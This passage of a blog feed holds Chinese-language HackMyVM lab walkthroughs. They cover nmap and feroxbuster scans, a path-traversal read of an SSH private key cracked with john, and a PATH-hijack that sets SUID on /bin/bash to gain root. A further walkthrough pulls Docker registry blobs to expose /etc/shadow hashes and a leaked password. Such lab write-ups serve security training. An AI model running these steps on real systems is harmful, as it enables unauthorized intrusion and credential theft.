+229 Entering Extended Passive Mode (|||52564|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        115          4096 Feb 27  2024 .
+drwxr-xr-x    2 0        115          4096 Feb 27  2024 ..
+-rw-r--r--    1 0        0             504 Feb 27  2024 message.txt
+226 Directory send OK.
+ftp&gt; mget message.txt
+mget message.txt [anpqy?]? y
+229 Entering Extended Passive Mode (|||10512|)
+150 Opening BINARY mode data connection for message.txt (504 bytes).
+100% |*****************************************************************************************|   504      825.81 KiB/s    00:00 ETA
+226 Transfer complete.
+504 bytes received in 00:00 (429.10 KiB/s)
+ftp&gt; exit
+221 Goodbye.                               
+```
+
+查看 message.txt 文件
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ cat message.txt 
+Hey guys!
+I made it, after all this time. That's right guys, the great precious immortality. The one coveted by all and achieved by none. Favoured by all and owned by none. 
+Now we have to be careful guys, we have to hide this from the world, from governments and other dangerous institutions. 
+They may even have already heard about our achievement, they are everywhere! That's why I have decided to strengthen the security of the server. What if they try to hack us!!! 
+Wishing you a long life, David.
+  
+嘿,伙计们！
+经过这么长时间，我做到了。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_Immortal.html</guid><pubDate>Thu, 20 Mar 2025 08:10:48 +0000</pubDate></item><item><title>hmv_friendly2</title><link>https://7r1UMPH.github.io/post/hmv_friendly2.html</link><description># hmv_friendly2
+
+# 0.简介
+
+**靶机**：[hackmyvm - friendly2](https://hackmyvm.eu/machines/machine.php?vm=friendly2)
+**难度**：绿色
+**目标 IP**：192.168.205.138
+**本机 IP**：192.168.205.141
+
+# 1.扫描
+
+`nmap`起手
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-24 09:37 CST
+Nmap scan report for 192.168.205.138
+Host is up (0.00057s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:0C:8F:A4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 2.63 seconds
+
+```
+
+# 2.踩点
+
+![Image](https://github.com/user-attachments/assets/0db9dabd-fe97-4b10-ac8c-fea7bb327606)
+
+尝试爆破目录
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ feroxbuster -u 'http://192.168.205.138' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md
+                                                                                                                                    
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben 'epi' Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://192.168.205.138
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [php, html, txt, md]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
+403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
+200      GET       91l      262w     2698c http://192.168.205.138/
+301      GET        9l       28w      319c http://192.168.205.138/assets =&gt; http://192.168.205.138/assets/
+301      GET        9l       28w      318c http://192.168.205.138/tools =&gt; http://192.168.205.138/tools/
+200      GET       91l      262w     2698c http://192.168.205.138/index.html
+200      GET     1710l     9966w   851305c http://192.168.205.138/assets/keyboard.png
+200      GET      644l     3260w   244133c http://192.168.205.138/assets/monitor.png
+200      GET     1965l    11601w   977099c http://192.168.205.138/assets/laptop.png
+200      GET       24l      148w     6861c http://192.168.205.138/assets/sirena.gif
+301      GET        9l       28w      328c http://192.168.205.138/tools/documents =&gt; http://192.168.205.138/tools/documents/
+200      GET       29l       99w      813c http://192.168.205.138/tools/index.html
+200      GET       35l      101w      841c http://192.168.205.138/tools/documents/monitor.html
+200      GET       50l      126w     1169c http://192.168.205.138/tools/documents/keyboard.html
+200      GET       35l      101w      879c http://192.168.205.138/tools/documents/laptop.html
+[####################] - 2m    622895/622895  0s      found:13      errors:1      
+[####################] - 2m    311410/311410  2719/s  http://192.168.205.138/ 
+[####################] - 2s    311410/311410  184157/s http://192.168.205.138/assets/ =&gt; Directory listing (add --scan-dir-listings to scan)
+[####################] - 2m    311410/311410  2662/s  http://192.168.205.138/tools/ 
+[####################] - 0s    311410/311410  7077500/s http://192.168.205.138/tools/documents/ =&gt; Directory listing (add --scan-dir-listings to scan)
+```
+
+其中`/tools/`目录，我们比较感兴趣
+
+![Image](https://github.com/user-attachments/assets/4cecf106-19df-416e-b3c1-2da93f1dcbf6)
+
+有一个疑似目录包含路径，我们加上尝试
+
+![Image](https://github.com/user-attachments/assets/07421b64-12cb-4fe0-b6e8-48f94239bddc)
+
+再尝试可不可以使用**PHP 过滤器链**
+
+![Image](https://github.com/user-attachments/assets/0788d850-d370-4605-9661-192ba52e50bb)
+
+不行，那我们还是去读它密钥吧
+
+![Image](https://github.com/user-attachments/assets/286bfaa9-f0e2-4543-9ce7-711916d35160)
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ vim id_rsa 
+                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ chmod 600 id_rsa
+                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ ssh gh0st@192.168.205.138 -i id_rsa
+The authenticity of host '192.168.205.138 (192.168.205.138)' can't be established.
+ED25519 key fingerprint is SHA256:YDW5zhbCol/1L6a3swXHsFDV6D3tUVbC09Ch+bxLR08.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.205.138' (ED25519) to the list of known hosts.
+Enter passphrase for key 'id_rsa': 
+
+                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ ssh2john id_rsa &gt; hash                             
+                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+No password hashes left to crack (see FAQ)
+                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ john hash --show                                   
+id_rsa:celtic
+
+1 password hash cracked, 0 left
+                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ ssh gh0st@192.168.205.138 -i id_rsa                
+Enter passphrase for key 'id_rsa': 
+Linux friendly2 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+gh0st@friendly2:~$ id
+uid=1001(gh0st) gid=1001(gh0st) groups=1001(gh0st)
+
+```
+
+# 3.提权
+
+```bash
+gh0st@friendly2:~$ sudo -l
+Matching Defaults entries for gh0st on friendly2:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User gh0st may run the following commands on friendly2:
+    (ALL : ALL) SETENV: NOPASSWD: /opt/security.sh
+gh0st@friendly2:~$ cat /opt/security.sh
+#!/bin/bash
+
+echo 'Enter the string to encode:'
+read string
+
+# Validate that the string is no longer than 20 characters
+if [[ ${#string} -gt 20 ]]; then
+  echo 'The string cannot be longer than 20 characters.'
+  exit 1
+fi
+
+# Validate that the string does not contain special characters
+if echo '$string' | grep -q '[^[:alnum:] ]'; then
+  echo 'The string cannot contain special characters.'
+  exit 1
+fi
+
+sus1='A-Za-z'
+sus2='N-ZA-Mn-za-m'
+
+encoded_string=$(echo '$string' | tr $sus1 $sus2)
+
+echo 'Original string: $string'
+echo 'Encoded string: $encoded_string'
+gh0st@friendly2:~$ ls -la /opt/
+total 16
+drwxr-xr-x  3 root root 4096 Apr 29  2023 .
+drwxr-xr-x 19 root root 4096 Apr 27  2023 ..
+drwxr-xr-x  2 root root 4096 Apr 29  2023 0-day
+-rwxr-xr-x  1 root root  561 Apr 29  2023 security.sh
+
+```
+
+实现用户输入不超20个字符且不能有特殊符号，将输入信息ROT13 编码，我们改个环境变量就好了，它没用绝对路径
+
+```bash
+gh0st@friendly2:/tmp$ echo 'chmod u+s /bin/bash' &gt; grep
+gh0st@friendly2:/tmp$ chmod +x grep 
+gh0st@friendly2:/tmp$ ls -la /bin/bash
+-rwxr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
+gh0st@friendly2:/tmp$ sudo PATH=$PWD:$PATH /opt/security.sh
+Enter the string to encode:
+aaassss
+The string cannot contain special characters.
+gh0st@friendly2:/tmp$ ls -la /bin/bash
+-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
+gh0st@friendly2:/tmp$ bash -p
+bash-5.1# id
+uid=1001(gh0st) gid=1001(gh0st) euid=0(root) groups=1001(gh0st)
+bash-5.1# cat /root/
+.bash_history  .bashrc        interfaces.sh  .local/        .profile       root.txt     
+bash-5.1# cat /root/root.txt 
+Not yet! Try to find root.txt.
+
+
+Hint: ...
+bash-5.1# find / -name '...' 2&gt;/dev/null
+/...
+bash-5.1# cd /.../
+bash-5.1# ls -al
+total 12
+d-wx------  2 root root 4096 Apr 29  2023 .
+drwxr-xr-x 19 root root 4096 Apr 27  2023 ..
+-r--------  1 root root  100 Apr 29  2023 ebbg.txt
+bash-5.1# cat ebbg.txt 
+It's codified, look the cipher:
+
+98199n723q0s44s6rs39r33685q8pnoq
+
+
+
+Hint: numbers are not codified
+
+```
+
+![Image](https://github.com/user-attachments/assets/f1d96202-91e2-4915-adb2-fd428994419b)。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_friendly2.html</guid><pubDate>Thu, 20 Mar 2025 08:07:44 +0000</pubDate></item><item><title>hmv_flossy</title><link>https://7r1UMPH.github.io/post/hmv_flossy.html</link><description># hmv_flossy
+
+# 0.简介
+
+**靶机**：[hackmyvm - flossy](https://hackmyvm.eu/machines/machine.php?vm=flossy)
+**难度**：黄色
+**目标 IP**：192.168.205.138
+**本机 IP**：192.168.205.141
+
+# 1.扫描
+
+`nmap`起手
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-17 16:18 CST
+Nmap scan report for 192.168.205.138
+Host is up (0.00026s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:61:56:42 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.43 seconds
+
+```
+
+先看**80端口**，**22端口**候补
+
+# 2.踩点
+
+![Image](https://github.com/user-attachments/assets/b9a4753b-3614-43d8-adff-220881ce04cd)
+
+一个查询页面，可以输入数值进行查询，有效范围是**1-99**，后面的数据是重复的。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_flossy.html</guid><pubDate>Thu, 20 Mar 2025 08:06:41 +0000</pubDate></item><item><title>hmv_espo</title><link>https://7r1UMPH.github.io/post/hmv_espo.html</link><description># hmv_espo
+
+# 0.简介
+
+**靶机**：[hackmyvm - espo](https://hackmyvm.eu/machines/machine.php?vm=espo)
+**难度**：黄色
+**目标 IP**：192.168.205.236
+**本机 IP**：192.168.205.141
+
+---
+
+# 1.扫描
+
+`nmap`起手
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS -p- -Pn -n -T4 192.168.205.236
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-08 13:19 CST
+Nmap scan report for 192.168.205.236
+Host is up (0.00024s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:9F:01:54 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds                                                            
+```
+
+---
+
+# 2.踩点
+
+![image](https://github.com/user-attachments/assets/ba54a62f-4f78-4f4d-89e2-686f549e1ed3)
+
+是个登录栏，搜索一下有没有什么漏洞
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ whatweb http://192.168.205.236                                     
+http://192.168.205.236 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx], IP[192.168.205.236], PHP[8.2.7], PoweredBy[EspoCRM], Script[text/javascript], Title[EspoCRM], UncommonHeaders[x-content-type-options,content-security-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/8.2.7], nginx
+                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ searchsploit EspoCRM
+---------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                      |  Path
+---------------------------------------------------------------------------------------------------- ---------------------------------
+EspoCRM 5.8.5 - Privilege Escalation                                                                | multiple/webapps/48376.txt
+---------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+                                 
+```
+
+只有权限提升漏洞，但是我们没有用户。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_espo.html</guid><pubDate>Thu, 20 Mar 2025 08:05:38 +0000</pubDate></item><item><title>hmv_Doll</title><link>https://7r1UMPH.github.io/post/hmv_Doll.html</link><description># hmv_Doll
+
+# 0.闲聊
+
+![image](assets/image-20250129201949-6vewhf4.png)
+
+**靶机：** https://hackmyvm.eu/machines/machine.php?vm=Doll
+
+**靶机 IP：** 192.168.72.129
+
+**kali IP：** 192.168.72.128
+
+今天年初二，有点空，更新一下wp
+
+# 1.扫描
+
+​`nmap`​开扫
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS -Pn -n -p- --min-rate 10000 192.168.72.129
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-29 20:16 EST
+Nmap scan report for 192.168.72.129
+Host is up (0.00020s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+1007/tcp open  unknown
+MAC Address: 08:00:27:F7:F4:53 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.19 seconds
+                                                                  
+```
+
+其中`1007`​不知道是什么服务，我们详细扫描一下
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sT -sV -Pn -n -p1007 192.168.72.129        
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-29 20:17 EST
+Nmap scan report for 192.168.72.129
+Host is up (0.00039s latency).
+
+PORT     STATE SERVICE VERSION
+1007/tcp open  http    Docker Registry (API: 2.0)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.26 seconds
+
+```
+
+不知道是什么东西，我们等会搜索一下
+
+# 2.踩点
+
+在**hacktricks**​上找到[5000 - Pentesting Docker Registry](https://book.hacktricks.wiki/zh/network-services-pentesting/5000-pentesting-docker-registry.html)这篇文章
+
+![image](assets/image-20250129202845-u4dct3k.png)
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.72.129:1007/v2/_catalog
+{'repositories':['dolly']}
+                              
+```
+
+继续利用
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.72.129:1007/v2/dolly/tags/list
+{'name':'dolly','tags':['latest']}
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.72.129:1007/v2/dolly/manifests/latest
+{
+   'schemaVersion': 1,
+   'name': 'dolly',
+   'tag': 'latest',
+   'architecture': 'amd64',
+   'fsLayers': [
+      {
+         'blobSum': 'sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017'
+      },
+      {
+         'blobSum': 'sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4'
+      },
+      {
+         'blobSum': 'sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4'
+      },
+      {
+         'blobSum': 'sha256:f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09'
+      }
+   ],
+   'history': [
+      {
+         'v1Compatibility': '{\'architecture\':\'amd64\',\'config\':{\'Hostname\':\'10ddd4608cdf\',\'Domainname\':\'\',\'User\':\'\',\'AttachStdin\':true,\'AttachStdout\':true,\'AttachStderr\':true,\'Tty\':true,\'OpenStdin\':true,\'StdinOnce\':true,\'Env\':[\'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\'],\'Cmd\':[\'/bin/sh\'],\'Image\':\'doll\',\'Volumes\':null,\'WorkingDir\':\'\',\'Entrypoint\':null,\'OnBuild\':null,\'Labels\':{}},\'container\':\'10ddd4608cdfd81cd95111ecfa37499635f430b614fa326a6526eef17a215f06\',\'container_config\':{\'Hostname\':\'10ddd4608cdf\',\'Domainname\':\'\',\'User\':\'\',\'AttachStdin\':true,\'AttachStdout\':true,\'AttachStderr\':true,\'Tty\':true,\'OpenStdin\':true,\'StdinOnce\':true,\'Env\':[\'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\'],\'Cmd\':[\'/bin/sh\'],\'Image\':\'doll\',\'Volumes\':null,\'WorkingDir\':\'\',\'Entrypoint\':null,\'OnBuild\':null,\'Labels\':{}},\'created\':\'2023-04-25T08:58:11.460540528Z\',\'docker_version\':\'23.0.4\',\'id\':\'89cefe32583c18fc5d6e6a5ffc138147094daac30a593800fe5b6615f2d34fd6\',\'os\':\'linux\',\'parent\':\'1430f49318669ee82715886522a2f56cd3727cbb7cb93a4a753512e2ca964a15\'}'
+      },
+      {
+         'v1Compatibility': '{\'id\':\'1430f49318669ee82715886522a2f56cd3727cbb7cb93a4a753512e2ca964a15\',\'parent\':\'638e8754ced32813bcceecce2d2447a00c23f68c21ff2d7d125e40f1e65f1a89\',\'comment\':\'buildkit.dockerfile.v0\',\'created\':\'2023-03-29T18:19:24.45578926Z\',\'container_config\':{\'Cmd\':[\'ARG passwd=devilcollectsit\']},\'throwaway\':true}'
+      },
+      {
+         'v1Compatibility': '{\'id\':\'638e8754ced32813bcceecce2d2447a00c23f68c21ff2d7d125e40f1e65f1a89\',\'parent\':\'cf9a548b5a7df66eda1f76a6249fa47037665ebdcef5a98e7552149a0afb7e77\',\'created\':\'2023-03-29T18:19:24.45578926Z\',\'container_config\':{\'Cmd\':[\'/bin/sh -c #(nop)  CMD [\\\'/bin/sh\\\']\']},\'throwaway\':true}'
+      },
+      {
+         'v1Compatibility': '{\'id\':\'cf9a548b5a7df66eda1f76a6249fa47037665ebdcef5a98e7552149a0afb7e77\',\'created\':\'2023-03-29T18:19:24.348438709Z\',\'container_config\':{\'Cmd\':[\'/bin/sh -c #(nop) ADD file:9a4f77dfaba7fd2aa78186e4ef0e7486ad55101cefc1fabbc1b385601bb38920 in / \']}}'
+      }
+   ],
+   'signatures': [
+      {
+         'header': {
+            'jwk': {
+               'crv': 'P-256',
+               'kid': 'X7W5:IVTA:CKTP:A6JJ:IMVJ:FOTQ:OO4M:CB4C:6JYB:PX6R:DQ6C:JPGS',
+               'kty': 'EC',
+               'x': 'm6jL0NHxYkVUo0-ID-HLzT0Y3OqOeOBvekpF98kC-4c',
+               'y': 'WlToBayTJ8f4zcry3wiq1fMvedgRkuwE7Oycza83_YA'
+            },
+            'alg': 'ES256'
+         },
+         'signature': 'n75fkjkUhAvtqrT2JfMVuBUtIUgiZ0ZhgYmM4m9kqOHprKnq7YrMyNKYYTntkxDmN2uW2w_3o36LvmRW7KzyOg',
+         'protected': 'eyJmb3JtYXRMZW5ndGgiOjI4MjksImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAyNS0wMS0zMFQwMToyOTo0NVoifQ'
+      }
+   ]
+}                                                                                                                                     
+
+┌──(kali㉿kali)-[~/test]
+└─$ mkdir tmp     
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ cd tmp 
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ curl http://192.168.72.129:1007/v2/dolly/blobs/sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017 -o blob1.tar
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  3707  100  3707    0     0   971k      0 --:--:-- --:--:-- --:--:-- 1206k
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ tar -xf blob1.tar
+                         
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ ls -la
+总计 24
+drwxrwxr-x 5 kali kali 4096  1月29日 20:32 .
+drwxrwxr-x 4 kali kali 4096  1月29日 20:32 ..
+-rw-rw-r-- 1 kali kali 3707  1月29日 20:32 blob1.tar
+drwxr-xr-x 2 kali kali 4096 2023年 4月25日 etc
+drwxr-xr-x 3 kali kali 4096 2023年 4月25日 home
+drwx------ 2 kali kali 4096 2023年 4月25日 root
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ cd etc 
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/etc]
+└─$ ls -al
+总计 32
+drwxr-xr-x 2 kali kali 4096 2023年 4月25日 .
+drwxrwxr-x 5 kali kali 4096  1月29日 20:32 ..
+-rw-r--r-- 1 kali kali  710 2023年 4月25日 group
+-rw-r--r-- 1 kali kali  697 2022年11月 4日 group-
+-rw-r--r-- 1 kali kali 1223 2023年 4月25日 passwd
+-rw-r--r-- 1 kali kali 1223 2023年 4月25日 passwd-
+-rw-r----- 1 kali kali  553 2023年 4月25日 shadow
+-rw-r----- 1 kali kali  448 2023年 4月25日 shadow-
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/etc]
+└─$ cat *   
+root:x:0:root
+bin:x:1:root,bin,daemon
+daemon:x:2:root,bin,daemon
+sys:x:3:root,bin,adm
+adm:x:4:root,adm,daemon
+tty:x:5:
+disk:x:6:root,adm
+lp:x:7:lp
+mem:x:8:
+kmem:x:9:
+wheel:x:10:root
+floppy:x:11:root
+mail:x:12:mail
+news:x:13:news
+uucp:x:14:uucp
+man:x:15:man
+cron:x:16:cron
+console:x:17:
+audio:x:18:
+cdrom:x:19:
+dialout:x:20:root
+ftp:x:21:
+sshd:x:22:
+input:x:23:
+at:x:25:at
+tape:x:26:root
+video:x:27:root
+netdev:x:28:
+readproc:x:30:
+squid:x:31:squid
+xfs:x:33:xfs
+kvm:x:34:kvm
+games:x:35:
+shadow:x:42:
+cdrw:x:80:
+www-data:x:82:
+usb:x:85:
+vpopmail:x:89:
+users:x:100:games
+ntp:x:123:
+nofiles:x:200:
+smmsp:x:209:smmsp
+locate:x:245:
+abuild:x:300:
+utmp:x:406:
+ping:x:999:
+nogroup:x:65533:
+nobody:x:65534:
+bela:x:1000:
+root:x:0:root
+bin:x:1:root,bin,daemon
+daemon:x:2:root,bin,daemon
+sys:x:3:root,bin,adm
+adm:x:4:root,adm,daemon
+tty:x:5:
+disk:x:6:root,adm
+lp:x:7:lp
+mem:x:8:
+kmem:x:9:
+wheel:x:10:root
+floppy:x:11:root
+mail:x:12:mail
+news:x:13:news
+uucp:x:14:uucp
+man:x:15:man
+cron:x:16:cron
+console:x:17:
+audio:x:18:
+cdrom:x:19:
+dialout:x:20:root
+ftp:x:21:
+sshd:x:22:
+input:x:23:
+at:x:25:at
+tape:x:26:root
+video:x:27:root
+netdev:x:28:
+readproc:x:30:
+squid:x:31:squid
+xfs:x:33:xfs
+kvm:x:34:kvm
+games:x:35:
+shadow:x:42:
+cdrw:x:80:
+www-data:x:82:
+usb:x:85:
+vpopmail:x:89:
+users:x:100:games
+ntp:x:123:
+nofiles:x:200:
+smmsp:x:209:smmsp
+locate:x:245:
+abuild:x:300:
+utmp:x:406:
+ping:x:999:
+nogroup:x:65533:
+nobody:x:65534:
+root:x:0:0:root:/root:/bin/ash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+man:x:13:15:man:/usr/man:/sbin/nologin
+postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
+squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
+xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+cyrus:x:85:12::/usr/cyrus:/sbin/nologin
+vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+bela:x:1000:1000:Linux User,,,:/home/bela:/bin/ash
+root:x:0:0:root:/root:/bin/ash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+man:x:13:15:man:/usr/man:/sbin/nologin
+postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
+squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
+xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+cyrus:x:85:12::/usr/cyrus:/sbin/nologin
+vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+bela:x:1000:1000:Linux User,,,:/home/bela:/bin/ash
+root:*::0:::::
+bin:!::0:::::
+daemon:!::0:::::
+adm:!::0:::::
+lp:!::0:::::
+sync:!::0:::::
+shutdown:!::0:::::
+halt:!::0:::::
+mail:!::0:::::
+news:!::0:::::
+uucp:!::0:::::
+operator:!::0:::::
+man:!::0:::::
+postmaster:!::0:::::
+cron:!::0:::::
+ftp:!::0:::::
+sshd:!::0:::::
+at:!::0:::::
+squid:!::0:::::
+xfs:!::0:::::
+games:!::0:::::
+cyrus:!::0:::::
+vpopmail:!::0:::::
+ntp:!::0:::::
+smmsp:!::0:::::
+guest:!::0:::::
+nobody:!::0:::::
+bela:$6$azVVFjn.mkvh.lhA$yAXPBGOZDXRdDBmn3obtzhUzxwfDD7u3YIcixohpKzTGpJS0Oeu7UVoguhmwg4DHNM8K5z7Tn93BBaDadM/A5.:19472:0:99999:7:::
+root:*::0:::::
+bin:!::0:::::
+daemon:!::0:::::
+adm:!::0:::::
+lp:!::0:::::
+sync:!::0:::::
+shutdown:!::0:::::
+halt:!::0:::::
+mail:!::0:::::
+news:!::0:::::
+uucp:!::0:::::
+operator:!::0:::::
+man:!::0:::::
+postmaster:!::0:::::
+cron:!::0:::::
+ftp:!::0:::::
+sshd:!::0:::::
+at:!::0:::::
+squid:!::0:::::
+xfs:!::0:::::
+games:!::0:::::
+cyrus:!::0:::::
+vpopmail:!::0:::::
+ntp:!::0:::::
+smmsp:!::0:::::
+guest:!::0:::::
+nobody:!::0:::::
+bela:!:19472:0:99999:7:::
+                                 
+┌──(kali㉿kali)-[~/test/tmp/etc]
+└─$ cd ..                                
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ ls la 
+ls: 无法访问 'la': 没有那个文件或目录
+                                                                                                                                     
